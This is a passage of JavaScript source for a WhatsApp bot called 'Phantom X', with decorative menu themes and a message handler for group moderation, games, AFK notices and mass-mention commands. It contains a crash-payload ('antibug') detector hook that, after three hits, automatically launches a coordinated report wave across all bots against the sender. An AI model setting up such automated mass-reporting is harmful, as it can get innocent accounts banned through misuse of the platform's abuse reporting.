    return (o + `\n˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚\n  🌸 _Phantom X — Soft but Deadly_ 💫\n˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚`).trim();
}

// ─── THEME 12: DIAMOND ───
function buildThemeDiamond(ml, time, up, S) {
    let o = `◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇\n\n   💎  *𝐏 𝐇 𝐀 𝐍 𝐓 𝐎 𝐌  𝐗*  💎\n   _𝐄𝐥𝐢𝐭𝐞. 𝐏𝐨𝐥𝐢𝐬𝐡𝐞𝐝. 𝐋𝐞𝐠𝐞𝐧𝐝𝐚𝐫𝐲._\n\n◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇\n\n  💠  *𝐁𝐨𝐭*      ⬩  𝐏𝐡𝐚𝐧𝐭𝐨𝐦 𝐗\n  💠  *𝐕𝐞𝐫𝐬𝐢𝐨𝐧* ⬩  v${BOT_VERSION}\n  💠  *𝐌𝐨𝐝𝐞*     ⬩  ${ml}\n  💠  *𝐔𝐩𝐭𝐢𝐦𝐞*   ⬩  ${up}\n  💠  *𝐓𝐢𝐦𝐞*     ⬩  ${time}\n`;
    for (const s of S) { o += `\n◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆\n💎 *${s.emoji} ${s.title}* 💎\n◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆\n`; for (const [c] of s.items) o += `  ◆  *${c}*\n`; }
    return (o + `\n◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇\n  💎 _Phantom X — Rare. Refined. Relentless._ 💎\n◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇`).trim();
}

// ─── THEME 13: THUNDER ───
function buildThemeThunder(ml, time, up, S) {
    let o = `⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n\n  ⚡  *𝗣 𝗛 𝗔 𝗡 𝗧 𝗢 𝗠  𝗫*  ⚡\n  _𝗦𝘁𝗿𝗶𝗸𝗲𝘀 𝗟𝗶𝗸𝗲 𝗟𝗶𝗴𝗵𝘁𝗻𝗶𝗻𝗴. 𝗡𝗼 𝗪𝗮𝗿𝗻𝗶𝗻𝗴._\n\n⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n\n  ⚡  *𝗕𝗼𝘁*      ⟹  Phantom X\n  ⚡  *𝗩𝗲𝗿𝘀𝗶𝗼𝗻* ⟹  v${BOT_VERSION}\n  ⚡  *𝗠𝗼𝗱𝗲*     ⟹  ${ml}\n  ⚡  *𝗨𝗽𝘁𝗶𝗺𝗲*  ⟹  ${up}\n  ⚡  *𝗧𝗶𝗺𝗲*     ⟹  ${time}\n`;
    for (const s of S) { o += `\n⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n  *${s.emoji} ${s.title}*\n⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n`; for (const [c] of s.items) o += `  ⚡  *${c}*\n`; }
    return (o + `\n⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n  ⚡ _Phantom X — 𝗨𝗻𝘀𝘁𝗼𝗽𝗽𝗮𝗯𝗹𝗲. 𝗨𝗻𝘁𝗿𝗮𝗰𝗲𝗮𝗯𝗹𝗲._ ⚡\n⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡`).trim();
}

// ─── THEME 14: WARRIOR ───
function buildThemeWarrior(ml, time, up, S) {
    let o = `⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️\n\n   🛡️  *ᴘʜᴀɴᴛᴏᴍ  x*  🛡️\n   _ꜰᴏʀɢᴇᴅ ɪɴ ᴛʜᴇ ᴅɪɢɪᴛᴀʟ ꜰɪʀᴇ_\n\n⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️\n\n  🗡️  *ʙᴏᴛ*      ⟫  Phantom X\n  🗡️  *ᴠᴇʀꜱɪᴏɴ*  ⟫  v${BOT_VERSION}\n  🗡️  *ᴍᴏᴅᴇ*     ⟫  ${ml}\n  🗡️  *ᴜᴘᴛɪᴍᴇ*   ⟫  ${up}\n  🗡️  *ᴛɪᴍᴇ*     ⟫  ${time}\n`;
    for (const s of S) { o += `\n⚔️ ──────────────────────── ⚔️\n  🛡️ *${s.emoji} ${s.title}*\n⚔️ ──────────────────────── ⚔️\n`; for (const [c] of s.items) o += `  🗡️  *${c}*\n`; }
    return (o + `\n⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️\n  🛡️ _ᴘʜᴀɴᴛᴏᴍ x — ɴᴏ ᴍᴇʀᴄʏ. ɴᴏ ʀᴇᴛʀᴇᴀᴛ._ ⚔️\n⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️`).trim();
}

// ─── THEME 15: NEON ───
function buildThemeNeon(ml, time, up, S) {
    let o = `🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣\n\n  🌈  *Ⓟ Ⓗ Ⓐ Ⓝ Ⓣ Ⓞ Ⓜ  ✘*  🌈\n  _Ⓛⓘⓣ  ⓤⓟ.  Ⓑⓤⓘⓛⓣ  ⓓⓘⓕⓕⓔⓡⓔⓝⓣ._\n\n🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣\n\n  🟣  *Bot*      ⇒  Phantom X\n  🔵  *Version*  ⇒  v${BOT_VERSION}\n  🟢  *Mode*     ⇒  ${ml}\n  🟡  *Uptime*   ⇒  ${up}\n  🟠  *Time*     ⇒  ${time}\n`;
    const neonDots = ['🟣','🔵','🟢','🟡','🟠','🔴']; let ni = 0;
    for (const s of S) { o += `\n🌈━━━━━━━━━━━━━━━━━━━━━━━━━━🌈\n${neonDots[ni%6]}  *${s.emoji} ${s.title}*\n🌈━━━━━━━━━━━━━━━━━━━━━━━━━━🌈\n`; ni++; for (const [c] of s.items) o += `  ${neonDots[ni%6]}  *${c}*\n`; }
    return (o + `\n🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣\n  🌈 _Phantom X — Neon. Bold. Unstoppable._ 🌈\n🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣`).trim();
}

// ─── THEME 16: SPY ───
function buildThemeSpy(ml, time, up, S) {
    let o = `🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️\n\n  ██  *[CLASSIFIED]*  ██\n  *PHANTOM X* — OPERATION: GHOST\n  _CLEARANCE LEVEL: ULTRA_ 🔐\n\n🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️\n\n  🔐  *AGENT*    :  PHANTOM X\n  🔐  *VERSION*  :  v${BOT_VERSION} [REDACTED]\n  🔐  *ACCESS*   :  ${ml}\n  🔐  *RUNTIME*  :  ${up}\n  🔐  *LOCAL_T*  :  ${time}\n`;
    for (const s of S) { o += `\n██████████████████████████\n🔐 *[MODULE :: ${s.title}]* ${s.emoji}\n██████████████████████████\n`; for (const [c] of s.items) o += `  ⬛  *${c}*\n`; }
    return (o + `\n🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️\n  🔐 _[END OF FILE] — PHANTOM X // EYES ONLY_ 🕵️\n🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️`).trim();
}

// ─── THEME 17: PIRATE ───
function buildThemePirate(ml, time, up, S) {
    let o = `🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️\n\n   ☠️  *P H A N T O M  X*  ☠️\n   _Sail the Digital Seas. Fear No Code._\n\n🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️\n\n  ⚓  *Ship*    »  Phantom X\n  ⚓  *Ver*     »  v${BOT_VERSION}\n  ⚓  *Crew*    »  ${ml}\n  ⚓  *Voyage*  »  ${up}\n  ⚓  *Waters*  »  ${time}\n`;
    for (const s of S) { o += `\n☠️ ─────────────────────────☠️\n  ⚓ *${s.emoji} ${s.title}*\n☠️ ─────────────────────────☠️\n`; for (const [c] of s.items) o += `  🗺️  *${c}*\n`; }
    return (o + `\n🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️\n  ⚓ _Phantom X — Plunder the Net. Leave No Trace._ ☠️\n🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️`).trim();
}

// ─── THEME 18: SHADOW ───
function buildThemeShadow(ml, time, up, S) {
    let o = `◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼\n\n   🌑  *𝑷 𝑯 𝑨 𝑵 𝑻 𝑶 𝑴  𝑿*  🌑\n   _𝘈𝘭𝘸𝘢𝘺𝘴 𝘞𝘢𝘵𝘤𝘩𝘪𝘯𝘨. 𝘕𝘦𝘷𝘦𝘳 𝘚𝘦𝘦𝘯._\n\n◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼\n\n  🌑  *Bot*      ⌁  Phantom X\n  🌑  *Version*  ⌁  v${BOT_VERSION}\n  🌑  *Mode*     ⌁  ${ml}\n  🌑  *Uptime*   ⌁  ${up}\n  🌑  *Time*     ⌁  ${time}\n`;
    for (const s of S) { o += `\n◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾\n  🌑 *${s.emoji} ${s.title}*\n◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾\n`; for (const [c] of s.items) o += `  🌑  *${c}*\n`; }
    return (o + `\n◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼\n  🌑 _Phantom X — The Shadow Never Sleeps_ 🖤\n◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼`).trim();
}

// ─── THEME 19: BOLD TECH ───
function buildThemeBoldTech(ml, time, up, S) {
    let o = `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n  🔲  *𝑷 𝑯 𝑨 𝑵 𝑻 𝑶 𝑴  𝑿*\n  _𝑷𝒓𝒐𝒈𝒓𝒂𝒎𝒎𝒆𝒅 𝒕𝒐 𝑫𝒐𝒎𝒊𝒏𝒂𝒕𝒆._\n\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n  ▣  *Bot*      →  Phantom X\n  ▣  *Version*  →  v${BOT_VERSION}\n  ▣  *Mode*     →  ${ml}\n  ▣  *Uptime*   →  ${up}\n  ▣  *Time*     →  ${time}\n`;
    for (const s of S) { o += `\n▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰\n  ▣ *${s.emoji} ${s.title}*\n▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰\n`; for (const [c] of s.items) o += `  ▣  *${c}*\n`; }
    return (o + `\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n  ▣ _Phantom X — 𝑷𝒓𝒆𝒄𝒊𝒔𝒊𝒐𝒏. 𝑷𝒐𝒘𝒆𝒓. 𝑷𝒉𝒂𝒏𝒕𝒐𝒎._ 🔲\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰`).trim();
}

// ─── THEME 20: ECHO ───
function buildThemeEcho(ml, time, up, S) {
    let o = `· · · · · · · · · · · · · · ·\n   ·   *P H A N T O M  X*   ·\n  · ·  _E · C · H · O_  · ·\n · · ·  )))  signal lost  · · ·\n· · · · · · · · · · · · · · ·\n\n  )))  Bot      ~  Phantom X\n  )))  Version  ~  v${BOT_VERSION}\n  )))  Mode     ~  ${ml}\n  )))  Uptime   ~  ${up}\n  )))  Time     ~  ${time}\n`;
    for (const s of S) { o += `\n· · · · · · · · · · · · · · ·\n  ))) *${s.emoji} ${s.title}* (\n· · · · · · · · · · · · · · ·\n`; for (const [c] of s.items) o += `  ·))  *${c}*\n`; }
    return (o + `\n· · · · · · · · · · · · · · ·\n  ))) _Phantom X — Echo fades. Ghost remains._ ·\n· · · · · · · · · · · · · · ·`).trim();
}

// --- MENU ---
function buildMenuText(mode, themeNum, isDev) {
    const time = new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos" });
    const modeLabel = (mode || "public") === "owner" ? "👤 Owner Only" : "🌍 Public";
    const uptime = formatUptime();
    const n = Number(themeNum) || 1;
    const S = isDev === undefined ? getMenuSections() : getVisibleSections(isDev);
    const ml = modeLabel;
    const up = uptime;
    let text;
    if (n === 2)  text = buildThemeMatrix(ml, time, up, S);
    else if (n === 3)  text = buildThemeRoyal(ml, time, up, S);
    else if (n === 4)  text = buildThemeInferno(ml, time, up, S);
    else if (n === 5)  text = buildThemeMinimal(ml, time, up, S);
    else if (n === 6)  text = buildThemeVoid(ml, time, up, S);
    else if (n === 7)  text = buildThemeVaporwave(ml, time, up, S);
    else if (n === 8)  text = buildThemeGothic(ml, time, up, S);
    else if (n === 9)  text = buildThemeCursive(ml, time, up, S);
    else if (n === 10) text = buildThemeCosmos(ml, time, up, S);
    else if (n === 11) text = buildThemeSoft(ml, time, up, S);
    else if (n === 12) text = buildThemeDiamond(ml, time, up, S);
    else if (n === 13) text = buildThemeThunder(ml, time, up, S);
    else if (n === 14) text = buildThemeWarrior(ml, time, up, S);
    else if (n === 15) text = buildThemeNeon(ml, time, up, S);
    else if (n === 16) text = buildThemeSpy(ml, time, up, S);
    else if (n === 17) text = buildThemePirate(ml, time, up, S);
    else if (n === 18) text = buildThemeShadow(ml, time, up, S);
    else if (n === 19) text = buildThemeBoldTech(ml, time, up, S);
    else if (n === 20) text = buildThemeEcho(ml, time, up, S);
    else text = buildThemeGhost(ml, time, up, S);
    // Developer contact footer — appended to every menu theme
    text += `\n\n━━━━━━━━━━━━━━━━━━━━\n` +
            `💎 *Powered by Phantom X*\n` +
            `📲 *Developer:*  wa.me/${DEV_NUMBER}\n` +
            `_To get premium access, message the developer._`;
    return text;
}

// --- ANTI-SPAM CHECK ---
function isSpamming(jid) {
    const now = Date.now();
    if (!spamTracker[jid]) spamTracker[jid] = { count: 0, lastTime: now };
    const tracker = spamTracker[jid];
    // Reset count if last message was more than 10 seconds ago
    if (now - tracker.lastTime > 10000) {
        tracker.count = 1;
        tracker.lastTime = now;
    } else {
        tracker.count++;
        tracker.lastTime = now;
    }
    // Flag as spam if more than 5 messages in 10 seconds
    return tracker.count > 5;
}

// --- MESSAGE HANDLER ---
async function handleMessage(sock, msg) {
    try {
        if (!msg.message) return;

        const from = msg.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        // Detect self-chat: check if the 'from' JID belongs to the bot's own number
        const ownNumber = (sock.user?.id || "").split(':')[0].split('@')[0];
        const fromNumber = from.split(':')[0].split('@')[0];
        const isSelfChat = !isGroup && (msg.key.fromMe || fromNumber === ownNumber);

        // Skip non-message types cleanly
        if (from === "status@broadcast") return;

        const type = getContentType(msg.message);
        const rawBody =
            (type === "conversation" && msg.message.conversation) ||
            (type === "extendedTextMessage" && msg.message.extendedTextMessage?.text) ||
            (type === "imageMessage" && msg.message.imageMessage?.caption) ||
            "";

        const senderJid = isGroup
            ? msg.key.participant || msg.participant
            : from;

        const reply = (text) => sock.sendMessage(from, { text }, { quoted: msg });
        const replyImg = async (imageUrl, caption) => {
            const buf = await fetchBuffer(imageUrl);
            await sock.sendMessage(from, { image: buf, caption }, { quoted: msg });
        };

        const botJid = sock.user?.id || null;
        const currentMode = getBotMode(botJid);

        if (getBotSecurity(botJid, "antibug") && !msg.key.fromMe && isSuspiciousBugPayload(rawBody)) {
            try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
            const reasons = getBugPayloadReasons(rawBody);
            console.log(`[AntiBug] Blocked payload from ${senderJid} in ${from} (${reasons.join(", ")})`);
            try {
                const senderNumOnly = normalizeNum(senderJid.split("@")[0].split(":")[0]);
                const hits = recordAntibugHit(senderJid);
                if (hits >= 3) {
                    addThreat(senderNumOnly, botJid, "spam", `Auto: ${hits} antibug hits in 30m (${reasons.join(", ")})`);
                    recordThreatBotAction(senderNumOnly, botJid, "trigger");
                    runReportWaveAcrossAllBots(senderNumOnly, "spam", { staggerSec: 10 }).catch(() => {});
                } else if (isThreatJid(senderJid)) {
                    recordThreatBotAction(senderNumOnly, botJid, "trigger");
                }
            } catch (e) { console.log(`[AntiBug] threat-net hookup err: ${e?.message}`); }
            // DM notify the owner
            try {
                const ownerJid = (botJid || "").replace(/:.*@/, "@").replace(/@g\.us/, "@s.whatsapp.net");
                const senderNum = senderJid.split("@")[0];
                await sock.sendMessage(ownerJid, {
                    text:
                        `🛡️ *Shield Alert*\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n\n` +
                        `⚠️ Incoming threat detected & neutralised\n\n` +
                        `📱 *Sender:*  +${senderNum}\n` +
                        `📍 *Location:*  ${isGroup ? "Group" : "Direct message"}\n` +
                        `🕐 *Time:*  ${new Date().toLocaleTimeString("en-NG", { timeZone: "Africa/Lagos" })}\n\n` +
                        `_Payload deleted before it rendered. You are protected._`
                });
            } catch (_) {}
            return;
        }

        // --- SILENCE CHECK — dev can mute a number from any specific bot ---
        if (!msg.key.fromMe && !isDevJid(senderJid) && isSilenced(botJid, senderJid)) return;

        // --- PREMIUM CHECK — only blocks if dev has explicitly .lock'd a command ---
        // Otherwise everyone gets every command. Premium system stays available via .lock/.unleash.
        if (!msg.key.fromMe && !isDevJid(senderJid) && rawBody?.startsWith(".")) {
            const cmdWord = rawBody.trim().split(" ")[0].toLowerCase();
            const premData = loadPremium();
            const lockedCmds = Object.keys(premData.unlocked_cmds || {})
                .concat(Object.keys(premData.locked_for || {}));
            const isCmdGated = lockedCmds.includes(cmdWord);
            if (isCmdGated && !hasPremiumAccess(senderJid, cmdWord)) {
                await sock.sendMessage(from, {
                    text:
                        `🔒 *${cmdWord}* is currently restricted.\n` +
                        `Please contact the developer for access.`
                }, { quoted: msg });
                return;
            }
        }

        // --- AUTO-REACT (runs on every group message before filtering) ---
        if (isGroup && !msg.key.fromMe) {
            const reactGroups = loadAutoReact();
            if (reactGroups[from]) {
                const emoji = reactGroups[from] === "random"
                    ? AUTO_REACT_EMOJIS[Math.floor(Math.random() * AUTO_REACT_EMOJIS.length)]
                    : reactGroups[from];
                try {
                    await sock.sendMessage(from, { react: { text: emoji, key: msg.key } });
                } catch (_) {}
            }
        }

        // --- ACTIVE GAME MOVE DETECTION (runs before trigger filter) ---
        if (isGroup && rawBody && !msg.key.fromMe) {
            const game = gameState[from];
            if (game?.type === "ttt") {
                const move = parseInt(rawBody.trim());
                if (move >= 1 && move <= 9) {
                    const idx = move - 1;
                    const currentPlayer = game.players[game.turn % 2];
                    if (senderJid !== currentPlayer) {
                        // Not your turn
                    } else if (game.board[idx] !== "") {
                        await reply("❌ That spot is taken. Pick another number 1-9.");
                    } else {
                        const mark = game.turn % 2 === 0 ? "X" : "O";
                        game.board[idx] = mark;
                        game.turn++;
                        if (checkTTTWin(game.board, mark)) {
                            await sock.sendMessage(from, {
                                text: `${renderTTTBoard(game.board)}\n\n🎉 @${senderJid.split("@")[0]} wins! 🏆`,
                                mentions: [senderJid],
                            });
                            delete gameState[from];
                        } else if (game.board.every(c => c !== "")) {
                            await reply(`${renderTTTBoard(game.board)}\n\n🤝 It's a draw!`);
                            delete gameState[from];
                        } else {
                            const next = game.players[game.turn % 2];
                            await sock.sendMessage(from, {
                                text: `${renderTTTBoard(game.board)}\n\n👉 @${next.split("@")[0]}'s turn (${game.turn % 2 === 0 ? "❌" : "⭕"})`,
                                mentions: [next],
                            });
                        }
                    }
                    return;
                }
            }
            if (game?.type === "wordchain") {
                const word = rawBody.trim().toLowerCase().replace(/[^a-z]/g, "");
                if (word.length > 0) {
                    const lastLetter = game.lastWord?.slice(-1);
                    if (lastLetter && word[0] !== lastLetter) {
                        await reply(`❌ Word must start with *${lastLetter.toUpperCase()}*. Try again!`);
                    } else if (game.usedWords?.includes(word)) {
                        await reply(`❌ *${word}* already used! Pick a different word.`);
                    } else {
                        if (!game.usedWords) game.usedWords = [];
                        game.usedWords.push(word);
                        game.lastWord = word;
                        game.lastPlayer = senderJid;
                        const nextLetter = word.slice(-1).toUpperCase();
                        await reply(`✅ *${word.toUpperCase()}* — Next word must start with *${nextLetter}*`);
                    }
                    return;
                }
            }
        }

        // --- TRIGGER FILTER ---
        const triggerChars = ['.', ',', '?'];
        const trimmedBody = rawBody.trimStart();
        const hasTrigger = trimmedBody && triggerChars.some(c => trimmedBody.startsWith(c));
        const hasHidetagAnywhere = rawBody && rawBody.split('\n').some(l => l.trim().toLowerCase().startsWith('.hidetag'));

        // For self-chat or owner group messages: only respond to trigger-prefixed commands
        if ((msg.key.fromMe || isSelfChat) && !hasTrigger && !hasHidetagAnywhere) return;
        // For DMs from other people: skip entirely (no command processing)
        if (!isGroup && !isSelfChat && !msg.key.fromMe) return;

        // --- BOT MODE ENFORCEMENT ---
        // In owner mode, only process commands sent by the bot owner themselves (fromMe)
        if (currentMode === "owner" && !msg.key.fromMe && !isSelfChat) return;

        // --- BAN CHECK (bot-level, skip if banned) ---
        if (!msg.key.fromMe && botJid && isBanned(botJid, senderJid)) return;

        // --- GROUP PROTECTION (runs on every group message) ---
        if (isGroup) {
            const anyAntiOn =
                getGroupSetting(from, "antilink") ||
                getGroupSetting(from, "antispam") ||
                getGroupSetting(from, "antibot") ||
                getGroupSetting(from, "antimention");

            let roles = { admins: new Set(), botIsAdmin: false };
            if (anyAntiOn) roles = await getGroupRoles(sock, from);
            const senderIsAdmin = roles.admins.has(senderJid);
            const skipForSender = msg.key.fromMe || senderIsAdmin || isDevJid(senderJid);

            // Anti-link
            if (getGroupSetting(from, "antilink") && rawBody && containsLink(rawBody) && !skipForSender) {
                if (!roles.botIsAdmin) {
                    // Bot can't moderate — silently log and skip to avoid useless warning spam
                    console.log(`[antilink] cannot enforce in ${from} — bot is not admin`);
                } else {
                    try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
                    const alWarnCount = addWarn(from, senderJid);
                    if (alWarnCount >= 3) {
                        resetWarns(from, senderJid);
                        try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
                        await sock.sendMessage(from, { text: `🚫 @${senderJid.split("@")[0]} has been kicked — 3 antilink warnings!`, mentions: [senderJid] });
                    } else {
                        await sock.sendMessage(from, {
                            text: `⚠️ @${senderJid.split("@")[0]}, links are not allowed here!\n⚠️ Warning *${alWarnCount}/3* — 3 warnings = kick.`,
                            mentions: [senderJid],
                        });
                    }
                    return;
                }
            }

            // Anti-spam
            if (getGroupSetting(from, "antispam") && rawBody && !skipForSender) {
                if (isSpamming(senderJid)) {
                    if (!roles.botIsAdmin) {
                        console.log(`[antispam] cannot enforce in ${from} — bot is not admin`);
                    } else {
                        try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
                        const asWarnCount = addWarn(from, senderJid);
                        if (asWarnCount >= 3) {
                            resetWarns(from, senderJid);
                            try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
                            await sock.sendMessage(from, { text: `🚫 @${senderJid.split("@")[0]} has been kicked — 3 antispam warnings!`, mentions: [senderJid] });
                        } else {
                            await sock.sendMessage(from, {
                                text: `🚫 @${senderJid.split("@")[0]}, slow down! Warning *${asWarnCount}/3* — 3 = kick.`,
                                mentions: [senderJid],
                            });
                        }
                        return;
                    }
                }
            }

            // Anti-mention (5+ mentions in one message = warn / kick)
            if (getGroupSetting(from, "antimention") && containsMassMention(msg) && !skipForSender) {
                if (!roles.botIsAdmin) {
                    console.log(`[antimention] cannot enforce in ${from} — bot is not admin`);
                } else {
                    try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
                    const amWarnCount = addWarn(from, senderJid);
                    if (amWarnCount >= 3) {
                        resetWarns(from, senderJid);
                        try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
                        await sock.sendMessage(from, { text: `🚫 @${senderJid.split("@")[0]} has been kicked — 3 antimention warnings!`, mentions: [senderJid] });
                    } else {
                        await sock.sendMessage(from, {
                            text: `📢 @${senderJid.split("@")[0]}, mass-mentions are not allowed!\n⚠️ Warning *${amWarnCount}/3* — 3 = kick.`,
                            mentions: [senderJid],
                        });
                    }
                    return;
                }
            }

            // Anti-bot — only kicks if the participant is clearly an automated newsletter / channel JID,
            // never on @lid (which is now used for many normal users).
            if (getGroupSetting(from, "antibot") && !msg.key.fromMe && !senderIsAdmin) {
                const looksAutomated = senderJid.endsWith("@newsletter") || senderJid.endsWith("@broadcast");
                if (looksAutomated && roles.botIsAdmin) {
                    try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
                    await sock.sendMessage(from, { text: `🤖 Automated account removed — anti-bot protection active.` });
                    return;
                }
            }

            // T11: bump message-count stats per group (non-bot messages with text)
            if (!msg.key.fromMe && rawBody) bumpStat(from, senderJid);

            // T10: AFK auto-clear when AFK user talks
            if (!msg.key.fromMe && getAfk(senderJid) && rawBody && !rawBody.toLowerCase().startsWith(".afk")) {
                const a = getAfk(senderJid);
                clearAfk(senderJid);
                const dur = Math.round((Date.now() - a.since) / 60000);
                await sock.sendMessage(from, { text: `👋 Welcome back @${senderJid.split("@")[0]} — you were AFK for ${dur} min.`, mentions: [senderJid] }, { quoted: msg });
            }

            // T10: notify if someone mentioned an AFK user
            if (!msg.key.fromMe) {
                const ctx = msg.message?.extendedTextMessage?.contextInfo;
                const mentioned = (Array.isArray(ctx?.mentionedJid) ? ctx.mentionedJid : [])
                    .concat(ctx?.participant ? [ctx.participant] : []);
                const seen = new Set();
                for (const m of mentioned) {
                    if (seen.has(m)) continue; seen.add(m);
                    const a = getAfk(m);
                    if (a) {
                        const dur = Math.round((Date.now() - a.since) / 60000);
                        await sock.sendMessage(from, { text: `💤 @${m.split("@")[0]} is AFK (${dur}m ago)\nReason: ${a.reason}`, mentions: [m] }, { quoted: msg });
                    }
                }
            }

            // Slowmode enforcement
            const slowSecs = getGroupSetting(from, "slowmode_seconds") || 0;
            if (slowSecs > 0 && !msg.key.fromMe && rawBody && !isDevJid(senderJid)) {
                if (!global.__slowMap) global.__slowMap = {};
                const key = `${from}|${senderJid}`;
                const last = global.__slowMap[key] || 0;
                const now = Date.now();
                if (now - last < slowSecs * 1000) {
                    const r2 = await getGroupRoles(sock, from);
                    if (r2.botIsAdmin && !r2.admins.has(senderJid)) {
                        try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
                        return;
                    }
                }
                global.__slowMap[key] = now;
            }

            // Auto-reply keywords + "phantom" trigger (for incoming group messages)
            if (!msg.key.fromMe && rawBody) {
                const lowerBody = rawBody.toLowerCase();
                // Phantom → send menu
                if (lowerBody.includes("phantom")) {
                    await sock.sendMessage(from, { text: buildMenuText(currentMode, getMenuTheme(botJid)) }, { quoted: msg });
                    return;
                }
                // Custom keywords
                const keywords = loadAutoReply();
                for (const [kw, rep] of Object.entries(keywords)) {
                    if (lowerBody.includes(kw.toLowerCase())) {
                        await sock.sendMessage(from, { text: rep }, { quoted: msg });
                        return;
                    }
                }
            }
        }

        let body = rawBody;
        if (!body) return;

        // Handle .readmore appearing ANYWHERE in the message
        if (body.toLowerCase().includes('.readmore')) {
            const lines = body.split('\n');
            const out = [];
            let changed = false;
            for (const line of lines) {
                const idx = line.toLowerCase().indexOf('.readmore');
                if (idx === -1) {
                    out.push(line);
                    continue;
                }
                changed = true;
                const beforeText = line.slice(0, idx).trim();
                const afterText = line.slice(idx + '.readmore'.length).trim();
                const hiddenPadding = '\n'.repeat(700);
                out.push(`${beforeText || ''}${hiddenPadding}${afterText || ''}`);
            }
            if (changed) {
                await sock.sendMessage(from, { text: out.join('\n') }, { quoted: msg });
                return;
            }
        }

        // Handle .hidetag appearing on any line (before or after a message)
        const bodyLines = body.trim().split('\n');
        const hidetagLineIdx = bodyLines.findIndex(l => l.trim().toLowerCase().startsWith('.hidetag'));
        if (isGroup && hidetagLineIdx !== -1) {
            try {
                const meta = await sock.groupMetadata(from);
                const members = meta.participants.map(p => p.id);
                const otherText = bodyLines.filter((_, i) => i !== hidetagLineIdx).join('\n').trim();
                // Invisible tag: mentions all members but shows no @numbers in text
                const invisibleText = otherText || '\u200e';
                await sock.sendMessage(from, {
                    text: invisibleText,
                    mentions: members,
                }, { quoted: msg });
            } catch (e) {
                await reply(`❌ Failed to hidetag: ${e?.message || "error"}`);
            }
            return;
        }

        const parts = body.trim().split(" ");
        let cmd = parts[0].toLowerCase();
        // Normalize , and ? prefix → . so users can use any of the three trigger chars
        if (cmd.length > 1 && (cmd.startsWith(',') || cmd.startsWith('?'))) {
            cmd = '.' + cmd.slice(1);
        }
        // --- ALIAS RESOLUTION ---
        const aliases = loadAliases();
        if (aliases[cmd]) {
            const aliasTarget = aliases[cmd];
            body = aliasTarget + (parts.slice(1).length ? " " + parts.slice(1).join(" ") : "");
            const reParts = body.trim().split(" ");
            cmd = reParts[0].toLowerCase();
        }

        // T08: command receipt reaction (fires for every recognized cmd start)
        if (cmd && cmd.startsWith(".")) reactToCmd(sock, msg, "received");

        switch (cmd) {
